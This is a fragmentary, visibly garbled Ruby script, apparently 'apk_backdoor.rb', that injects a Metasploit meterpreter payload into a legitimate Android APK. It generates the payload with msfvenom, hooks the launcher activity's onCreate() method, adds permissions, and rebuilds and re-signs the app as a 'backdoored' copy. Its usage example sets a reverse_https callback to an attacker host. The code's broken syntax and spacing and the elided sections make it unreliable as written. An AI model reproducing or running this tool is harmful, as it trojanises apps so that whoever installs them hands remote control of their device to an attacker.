...
puts "[*] Authored by timwr, Jack64".blue +
   "&".cyan +
   "Updated by xC0d3rZ.".blue# Find the activity thatapk_backdoor
   .rb is opened when you click the app icon
def findlauncheractivity(amanifest)
package = amanifest.xpath("//manifest")
   .first['package']
activities = amanifest.xpath(
   "//activity|//activity-alias"
)
for activity in activities
activityname = activity.attribute(
   "name")
...
if (categoryname.to_s ==
   'android.intent.category.LAUNCHER' ||
   categoryname.to_s ==
   'android.intent.action.MAIN')
   activityname = activityname.to_s
unless activityname.start_with ? (
   package)
...
end# If XML parsing of the manifest fails,
recursively search# the smali code
for the onCreate() hook and
let the user# pick the injection point
def scrapeFilesForLauncherActivity(
   org_dir)
smali_files || = []
Dir.glob(org_dir + '/smali*/**/*.smali') do
      |file |
      checkFile = File.read(
         file)
if (checkFile.include ?
...
Get permissions that are not in
   original APK
add_permissions = []
for permission in payload_permissions
if !(original_permissions.include ?
   permission)
...
File.open(d_original +
   "/AndroidManifest.xml",
   "w") { |
   file | file.puts new_mani
}
end
def randomString(size = 6)
charset = % w {
      2 3 4 6 7 9 A C D E F G H J K M N P Q R T V W X Y Z
   }
   (0...size)
   .map {
      charset.to_a[rand(
...
unless(apkfile)
puts
   "[+] Usage: #{$0} {target.apk} [msfvenom options]"
   .red + "\n"
puts
   "[+] e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443"
   .cyan
exit(1)
end
signapk = work_dir +
   "embed_tools/signapk/signapk.jar"
unless(signapk && File.readable ? (
   signapk))
...
apktool = work_dir +
   "embed_tools/apktool.jar"
unless(apktool && File.readable ? (
   apktool))
puts "[+] Cannot find apktool tool".red
exit(1)
end
apk_v =
   `$(pwd)/embed_tools/apktool.sh -version`;
unless(apk_v.split()[0].include ? ("2."))
puts
   "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n"
   .red
exit(1)
end
...
puts
   ...
   .cyan
puts
   "[-] Error parsing msfvenom options. Exiting."
   .red + "\n"
exit(1)
end
if (output_dir)
...
res =
   `msfvenom -f raw #{opts} -o #{f_payload} 2>&1`
if res.downcase.include ? ("invalid" ||
   "error")
puts res
exit(1)
end
...
f = File.open(d_original +
   "/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close
puts "[5] Locating onCreate() hook".yellow +
   "\n"
launcheractivity = findlauncheractivity(
   amanifest)
smalifile = d_original + '/smali/' +
   launcheractivity.gsub(/\./, "/") +
   '.smali'
begin
...
begin
results =
   scrapeFilesForLauncherActivity(
      d_original)
smalifile = results[0]
activitysmali = results[1]
rescue
puts
   "[-] Error finding launcher activity. Exiting."
   .red
exit(1)
end
end
...
puts "[6] Copying payload files".yellow +
   "\n"
FileUtils.mkdir_p(
   "#{d_original}/smali/com/metasploit/stage/"
)
FileUtils.cp Dir.glob(
      "#{d_payload}/smali/com/metasploit/stage/Payload*.smali"
   ),
   "#{d_original}/smali/com/metasploit/stage/"
activitycreate =
   ';->onCreate(Landroid/os/Bundle;)V'
...
hookedsmali = activitysmali.gsub(
   activitycreate,
   payloadhook)
puts "[7] Loading ".yellow + File.basename(
      smalifile) +
   " and injecting payload".yellow +
   "\n"
File.open(smalifile, "w") { | file |
      file.puts hookedsmali
}
injected_apk = "#{output_dir}/" +
   apkfile.split(".")[0]
...
puts
   "[9] Rebuilding #{apkfile} with meterpreter injection as "
   .yellow + File.basename(
      injected_apk) + "\n"
...
puts "[10] Signing".yellow + File.basename(
      injected_apk) + .cyan +
   "\n"
`$(pwd)/embed_tools/signapk.sh #{injected_apk} $(pwd)/__#{apkfile}_backdoored.apk`
puts
   "[11] Infected file __#{apkfile}_backdoored.apk ready."
   .green
